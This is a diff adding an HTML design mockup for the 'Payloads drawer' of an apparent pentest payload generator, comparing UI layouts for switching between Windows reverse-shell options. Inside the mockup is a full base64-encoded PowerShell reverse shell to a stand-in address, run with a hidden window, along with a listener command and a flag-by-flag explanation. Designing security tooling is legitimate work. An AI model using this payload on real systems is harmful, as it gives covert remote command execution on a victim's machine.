@@ -1,0 +1,112 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Payloads: switching between fits</title>
+<link href="https://fonts.googleapis.com/css2?family=Instrument+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#000;--fg:#fff;--fg2:#e8e8e8;--muted:#a8a8a8;--faint:#8a8a8a;--line:#1f1f1f;--line2:#2a2a2a;--ls:#3a3a3a;--surface:#0b0b0b;--hi:#111;--acc:#c6ff00;--warn:#e0a030}
+*{box-sizing:border-box;margin:0}
+::selection{background:rgba(198,255,0,.25);color:#fff}
+body{background:#050505;color:var(--fg2);font:14px/1.5 "Instrument Sans",system-ui,sans-serif;padding:28px 32px 40px}
+.page{display:grid;gap:22px}
+.intro{display:grid;gap:6px;max-width:72ch}
+.intro h1{font-size:20px;font-weight:600;color:var(--fg)}
+.intro p{color:var(--muted)}
+.row{display:grid;grid-template-columns:560px;gap:28px;align-items:start}
+.opt{display:grid;gap:10px}
+.opt h2{font-size:16px;font-weight:600;color:var(--fg)}
+.opt .why{color:var(--muted);font-size:14px}
+.mono{font-family:"JetBrains Mono",monospace}
+.lab{font-size:12px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);font-weight:600}
+.kbd{display:inline-grid;place-items:center;min-width:22px;border:1px solid var(--ls);border-radius:4px;padding:0 5px;font:12px "JetBrains Mono",monospace;color:var(--fg2);line-height:20px}
+
+/* drawer chrome, as shipped */
+.drawer{width:560px;height:860px;background:var(--bg);border:1px solid var(--line2);border-radius:8px;display:grid;grid-template-rows:auto auto minmax(0,1fr) auto;overflow:hidden}
+.tabs{display:grid;grid-template-columns:repeat(6,auto) 1fr auto;gap:5px;align-items:center;padding:12px 16px;border-bottom:1px solid var(--line)}
+.tab{border:1px solid var(--ls);border-radius:6px;padding:4px 8px;font-size:13px;color:var(--fg2);background:transparent;white-space:nowrap}
+.tab.on{border-color:var(--acc);color:var(--acc)}
+.full{border:1px solid var(--ls);border-radius:6px;width:28px;height:26px;display:grid;place-items:center;color:var(--muted)}
+.ctx{display:grid;gap:4px;padding:10px 16px 12px;border-bottom:1px solid var(--line)}
+.chips{display:grid;grid-template-columns:repeat(4,max-content);gap:16px;align-items:center;font-size:14px}
+.chips span b{font-weight:500;color:var(--fg)}
+.chips span{color:var(--muted)}
+.ev{font-size:13px;color:var(--muted)}
+.body{overflow:hidden;padding:14px 16px;display:grid;align-content:start;gap:14px;position:relative}
+.body{overflow:auto}
+.hint{border-top:1px solid var(--line);padding:10px 16px;font-size:13px;color:#c4c4c4;display:grid;grid-template-columns:repeat(4,max-content);gap:6px 16px}
+.hint>span{display:grid;grid-auto-flow:column;gap:6px;align-items:center;white-space:nowrap}
+
+.field{display:grid;grid-template-columns:52px 1fr;gap:10px;align-items:center}
+.field .l{font:13px "JetBrains Mono",monospace;color:var(--muted)}
+.input{border:1px solid var(--line2);border-radius:6px;padding:7px 10px;font:14px "JetBrains Mono",monospace;color:var(--fg)}
+.pre{background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:9px 12px;font:13.5px/1.6 "JetBrains Mono",monospace;color:var(--fg);white-space:pre-wrap;word-break:break-all}
+.clamp{max-height:calc(1.6em * 4 + 16px);overflow:hidden;position:relative}
+.clamp::after{content:"";position:absolute;left:0;right:0;bottom:0;height:28px;background:linear-gradient(transparent,#000)}
+.sec{display:grid;gap:5px}
+.more{font-size:13px;color:var(--muted)}
+.more u{text-decoration-color:var(--ls);text-underline-offset:3px}
+.parts{display:grid;grid-template-columns:116px 1fr;gap:5px 12px;font-size:13.5px}
+.parts dt{font-family:"JetBrains Mono",monospace;color:var(--fg)}
+.parts dd{color:var(--muted)}
+
+/* A: fit buttons */
+.fitbar{display:grid;gap:6px}
+.fitbtns{display:grid;grid-template-columns:repeat(3,max-content) 1fr max-content;gap:6px;align-items:center}
+.fb{border:1px solid var(--ls);border-radius:6px;padding:5px 10px;font-size:12.5px;color:var(--fg2);display:grid;grid-auto-flow:column;gap:7px;align-items:center;white-space:nowrap}
+.fb.on{border-color:var(--acc);color:var(--acc);background:rgba(198,255,0,.06)}
+.fb .n{font:10.5px "JetBrains Mono",monospace;color:var(--faint)}
+.fb.on .n{color:var(--acc)}
+.fb.mis{border-style:dashed;color:var(--muted)}
+.ttl{display:grid;grid-template-columns:1fr max-content;align-items:baseline;gap:10px}
+.ttl h3{font-size:16px;font-weight:600;color:var(--fg)}
+.fitwhy{font-size:12px;color:var(--acc)}
+
+/* B: fit list */
+.flist{display:grid;border:1px solid var(--line2);border-radius:8px;overflow:hidden}
+.fi{display:grid;grid-template-columns:24px 1fr max-content;gap:10px;align-items:center;padding:9px 12px;border-top:1px solid var(--line);font-size:14px}
+.fi:first-child{border-top:0}
+.fi .k{font:12px "JetBrains Mono",monospace;color:var(--faint);text-align:center}
+.fi .w{font-size:13px;color:var(--muted)}
+.fi.on{background:rgba(198,255,0,.06);box-shadow:inset 2px 0 0 var(--acc)}
+.fi.on .nm{color:var(--acc);font-weight:500}
+.fi.on .k{color:var(--acc)}
+.fi.mis .nm{color:var(--muted)}
+.fi.mis{background:var(--surface)}
+
+/* C: picker header */
+.pick{display:grid;grid-template-columns:28px 1fr 28px;gap:6px;align-items:stretch}
+.arrow{border:1px solid var(--ls);border-radius:6px;display:grid;place-items:center;color:var(--fg2);font-size:14px}
+.sel{border:1px solid var(--acc);border-radius:6px;padding:6px 10px;display:grid;grid-template-columns:1fr max-content max-content;gap:10px;align-items:center}
+.sel .nm{font-size:14.5px;font-weight:600;color:var(--fg)}
+.sel .of{font:11px "JetBrains Mono",monospace;color:var(--muted)}
+.sel .car{color:var(--acc)}
+.menu{border:1px solid var(--ls);border-radius:8px;background:var(--hi);display:grid;padding:4px;box-shadow:0 12px 32px rgba(0,0,0,.6)}
+.mi{display:grid;grid-template-columns:1fr max-content;padding:6px 8px;border-radius:5px;font-size:12.5px}
+.mi .w{color:var(--faint);font-size:11.5px}
+.mi.on{background:rgba(198,255,0,.08);color:var(--acc)}
+.mi.hd{color:var(--muted);font-size:11px;letter-spacing:.12em;text-transform:uppercase;font-weight:600;padding:8px 8px 4px;border-top:1px solid var(--line2);margin-top:4px}
+.mi.mis{color:var(--muted)}
+.rec{color:var(--acc);font-size:14px;font-weight:600}
+</style></head><body><div class="page">
+<div class="intro"><h1>Payloads drawer: switching between payloads that fit</h1>
+<p>The same Windows / cmd.exe case as your screenshot: 3 payloads fit and 6 don't. Today the alternatives are a grey "Also fits" line at the bottom. Each option below puts them at the top, as things you can obviously click, and keeps ⇥ for the keyboard. The payload is clamped to 4 lines (click it, or the line under it, to see all of it), so the explanation stays in view.</p></div>
+<div class="row">
+
+<!-- B -->
+<div class="opt"><h2>B · A short list of fits <span class="rec">· chosen, at readable sizes</span></h2><p class="why">Text sizes raised across the drawer: body 14px, secondary 13px, key labels 12px, and nothing smaller. The fits sit in a compact list at the top, one line each, with why it fits on the right. The "don't fit" line is the last row of the same list. It holds 9+ fits without wrapping, which matters once new payloads arrive, and the toggles can reorder it in place.</p>
+<div class="drawer">
+ <div class="tabs"><span class="tab on">Reverse shell</span><span class="tab">Transfer</span><span class="tab">SQL injection</span><span class="tab">msfvenom</span><span class="tab">Encode</span><span class="tab">Upgrade</span><span></span><span class="full">⤢</span></div>
+ <div class="ctx"><div class="chips"><span>no host</span><span>OS <b>Windows</b> ⌄</span><span>Paste into <b>cmd.exe</b> ⌄</span><span>Port <b class="mono">443</b> ⌄</span></div><div class="ev">OS set by you · paste context set by you · port from Settings</div></div>
+ <div class="body">
+  <div class="flist">
+   <div class="fi on"><span class="k">1</span><span class="nm">PowerShell base64 (-e)</span><span class="w">default · no quoting</span></div>
+   <div class="fi"><span class="k">2</span><span class="nm">Nishang cradle</span><span class="w">serves rev.ps1</span></div>
+   <div class="fi"><span class="k">3</span><span class="nm">nc.exe -e</span><span class="w">needs an nc.exe with -e</span></div>
+   <div class="fi mis"><span class="k">⌄</span><span class="nm">6 don't fit here</span><span class="w">show why</span></div>
+  </div>
+  <div class="field"><span class="l">LHOST</span><span class="input">192.0.2.10</span></div>
+  <div class="sec"><span class="lab">Listener</span><div class="pre">penelope -O -p 443</div></div>
+  <div class="sec"><span class="lab">Paste into cmd.exe</span><div class="pre clamp">powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMAAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA</div><span class="more">1,358 characters · <u>show all</u></span></div>
+  <div class="sec"><span class="lab">What each part does</span><dl class="parts"><dt>powershell</dt><dd>Starts PowerShell. One token, so no quoting breaks in cmd, a URL or a SQL string.</dd><dt>-nop</dt><dd>No profile, so nothing slows or alters the start.</dd><dt>-w hidden</dt><dd>No visible window on the target.</dd><dt>-e</dt><dd>Base64 of UTF-16LE text. Plain UTF-8 base64 produces garbage.</dd></dl></div>
+ </div>
+ <div class="hint"><span><span class="kbd">↵</span>copy payload</span> <span><span class="kbd">⌥L</span>copy listener</span> <span><span class="kbd">⇥</span>next fit</span> <span><span class="kbd">⌥O</span>OS</span> <span><span class="kbd">⌥W</span>where you paste</span> <span><span class="kbd">⌥1-6</span>generator</span> <span><span class="kbd">⌘↵</span>copy and log</span> <span><span class="kbd">Esc</span>close</span></div>
+</div></div>
+
+</div></div></body></html>
